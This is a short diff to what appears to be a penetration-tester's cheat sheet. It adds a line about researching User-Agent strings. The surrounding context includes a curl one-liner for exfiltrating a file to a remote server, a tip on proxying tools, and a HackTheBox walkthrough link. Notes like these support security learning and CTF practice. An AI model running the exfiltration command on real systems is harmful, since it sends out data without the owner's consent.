@@ -103,6 +103,8 @@ Common and/or useful files to check for when exploiting Local File Inclusion \(f
 
 ## To sort
 
+whatismybrowser.com - research User-Agent strings
+
 Use `curl` to exfiltrate file on remote server \(from attackers box\): `curl -d @/<file> <remote server>`
 
 in order to proxy tools that have no proxy option: create burn proxy 127.0.0.1:80 [Ippsec:HacktheBox - Granny & Grandpa](https://www.youtube.com/watch?v=ZfPVGJGkORQ)
